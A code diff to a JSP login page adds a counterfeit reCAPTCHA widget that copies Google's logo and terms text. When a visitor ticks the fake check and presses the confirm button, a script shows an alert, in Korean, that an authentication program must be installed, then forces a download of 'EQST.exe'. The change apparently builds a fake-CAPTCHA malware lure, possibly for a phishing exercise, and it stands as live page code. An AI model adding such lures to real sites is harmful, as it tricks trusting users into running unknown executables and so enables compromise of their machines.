@@ -21,7 +21,7 @@
 	background: white;
 	padding: 50px;
 	width: 500px;
-	height: 600px;
+	height: 650px;
 }
 
 #login--form label {
@@ -107,6 +107,57 @@ input[type=text], input[type=password] {
 	color: white;
 	background-color: #314f79;
 }
+.recaptcha-box {
+    width: 300px;
+    max-width: 350px;
+    margin: 0 auto 20px;
+    padding: 20px;
+    border: 2px solid #ccc;
+    border-radius: 8px;
+    background-color: #f9f9f9;
+    display: flex;
+    flex-direction: column;
+    font-family: Arial, sans-serif;
+    align-items: center;
+}
+
+.recaptcha-text {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    margin-bottom: 15px;
+    font-size: 16px;
+    color: #333;
+}
+
+.check-icon {
+    color: gray;
+    font-size: 22px;
+    margin-right: 10px;
+    transition: color 0.3s ease;
+}
+
+.checked .check-icon {
+    color: green;
+}
+
+.confirm-btn {
+    background-color: gray;
+    color: white;
+    padding: 12px 25px;
+    border: none;
+    border-radius: 5px;
+    cursor: not-allowed;
+    width: 100%;
+    text-align: center;
+    font-size: 16px;
+}
+
+.confirm-btn.active {
+    background-color: #007bff;
+    cursor: pointer;
+}
+
 </style>
 
 
@@ -135,6 +186,24 @@ input[type=text], input[type=password] {
 				</div>
 			</div>
 			<br>
+
+			<div class="recaptcha-box">
+                <div class="recaptcha-text" id="recaptchaText">
+                    <span class="check-icon">✔</span>
+                    <span>로봇이 아닙니다.</span>
+                </div>
+                <div class="recaptcha-logo-container">
+                    <div class="recaptcha-logo">
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                        <span>reCAPTCHA</span>
+                    </div>
+                    <div class="recaptcha-terms">
+                        개인정보 보호 · 약관
+                    </div>
+                </div>
+            <button class="confirm-btn" id="confirmButton" type="button" disabled>인증하기</button>
+            </div>
+
 			<div class="justify-content-center">
 				<div class="login--kakao--btn--wrap">
 					<button type="submit" class="btn btn--primary login--btn">로그인</button>
@@ -153,6 +222,33 @@ input[type=text], input[type=password] {
 		</form>
 	</div>
 </main>
+<script>
+    // 리캡챠 텍스트 클릭 이벤트
+    recaptchaText.addEventListener('click', function() {
+        recaptchaText.classList.toggle('checked');
 
+        if (recaptchaText.classList.contains('checked')) {
+            confirmButton.disabled = false;
+            confirmButton.classList.add('active');
+        } else {
+            confirmButton.disabled = true;
+            confirmButton.classList.remove('active');
+        }
+    });
+
+    // 인증 버튼 클릭 이벤트
+    confirmButton.addEventListener('click', function(event) {
+        event.preventDefault();
+
+        // 경고 메시지 출력
+        alert('인증 프로그램 설치가 필요합니다!!!!!');
+
+        // 파일 다운로드 로직
+        const link = document.createElement('a');
+        link.href = '/EQST.exe';
+        link.download = 'EQST.exe';
+        link.click();
+    });
+</script>
 <input type="hidden" name="menuName" id="menuName" value="">
 <%@ include file="/WEB-INF/view/layout/footer.jsp"%>
